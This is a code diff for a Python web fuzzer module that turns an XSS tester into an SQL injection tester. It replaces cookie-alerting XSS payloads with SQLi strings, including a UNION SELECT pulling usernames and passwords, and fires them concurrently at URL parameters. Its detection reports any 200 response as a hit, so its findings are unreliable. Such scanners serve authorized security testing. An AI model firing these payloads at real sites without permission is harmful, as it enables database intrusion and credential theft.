@@ -3,57 +3,60 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from colorama import Fore, Style
 import requests
 
-class XSS:
+class SQLi:
     def __init__(self, session, threads=5):
         self.session = session
         self.threads = threads
+        # Default SQLi payloads; you can extend or customize these
         self.payloads = [
-            '<script>alert("XSS")</script>',
-            '<img src=x onerror=alert("XSS")>',
-            '"><script>alert("XSS")</script>',
-            '<script>alert(document.cookie)</script>',
-            '<img src="#" onerror=alert(document.cookie)>',
-            '<body onload=alert("XSS")>',
-            '<scr<script>ipt>alert(document.cookie)</script>',
-            '#</select><img src=1 onerror=alert(document.cookie)>'
+            "' OR 1=1 --",
+            "' OR 'a'='a",
+            "' UNION SELECT NULL, username, password FROM users --",
+            "' AND 1=2 --",
+            "' OR 1=1#",
+            '" OR ""="',
+            "' OR 1=1/*"
         ]
-        self.indicators = ['alert', 'script', 'onerror']  # Keywords to detect XSS
+        # Optionally, you can define indicators for SQL errors here
 
     def set_payloads(self, payload_list):
         """
-        Set custom payloads from a list.
+        Replace the default payloads with custom payloads.
         """
         self.payloads = payload_list
 
     def filter_targets(self, targets):
         """
-        Filter targets to find those with parameters that could be vulnerable to XSS.
+        For SQLi, we simply use any target that has query parameters.
         """
-        xss_targets = []
+        sqli_targets = []
         for target in targets:
-            for param in target.get('params', []):
-                if any(keyword in param['html_type'] for keyword in ['text', 'textarea', 'url']):
-                    xss_targets.append(target)
-                    break
-        return xss_targets
+            if 'params' in target and target['params']:
+                sqli_targets.append(target)
+        return sqli_targets
 
     def test_target(self, target):
         """
-        Test a target for XSS vulnerabilities by replacing one parameter's value with a payload,
-        while preserving all the original parameters.
+        For each parameter in the target's URL, replace its value with each payload,
+        leaving the other parameters unchanged.
         """
         results = []
         original_url = target['url']
         parsed_url = urlparse(original_url)
+        # Parse the original query string into a dictionary (each value is a list)
         original_params = parse_qs(parsed_url.query)
 
-        for param in target['params']:
+        for param in target.get('params', []):
             param_name = param['name']
             for payload in self.payloads:
-                # Create a copy of original parameters and replace the target parameter's value
+                # Create a copy of the original parameters
                 new_params = original_params.copy()
+                # Replace the value for the target parameter with the payload.
+                # (Note: values are lists, so we wrap payload in a list)
                 new_params[param_name] = [payload]
+                # Build a new query string
                 new_query = urlencode(new_params, doseq=True)
+                # Reconstruct the URL with the new query string
                 new_url = urlunparse((
                     parsed_url.scheme,
                     parsed_url.netloc,
@@ -63,14 +66,12 @@ class XSS:
                     parsed_url.fragment
                 ))
                 try:
-                    if param['type'].upper() == 'GET':
-                        req = self.session.get(new_url, timeout=7)
-                    else:
-                        req = self.session.request(param['type'], new_url, timeout=7)
-                    
-                    if req.status_code == 200 and self.detect_vulnerability(req):
+                    req = self.session.get(new_url, timeout=7)
+                    # Basic check: if status is 200, report the result.
+                    # You might improve detection by comparing response lengths or error messages.
+                    if req.status_code == 200:
                         results.append({
-                            'type': 'XSS',
+                            'type': 'SQLi',
                             'url': req.url,
                             'param': param_name,
                             'payload': payload,
@@ -83,22 +84,15 @@ class XSS:
                     continue
         return results
 
-    def detect_vulnerability(self, response):
-        """
-        Detect if the response indicates a potential XSS vulnerability.
-        """
-        content = response.text.lower()
-        return any(ind in content for ind in self.indicators)
-
     def fuzz(self, targets):
         """
-        Fuzz a list of targets for XSS vulnerabilities.
+        Run the SQLi tests concurrently on the filtered targets.
         """
         filtered = self.filter_targets(targets)
-        print(f"{Fore.CYAN}[*] Testing {len(filtered)} targets for XSS{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] Testing {len(filtered)} targets for SQLi{Style.RESET_ALL}")
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = [executor.submit(self.test_target, t) for t in filtered]
-            results = [r for future in futures for r in future.result() if r]
+            results = [result for future in futures for result in future.result()]
         
         return results
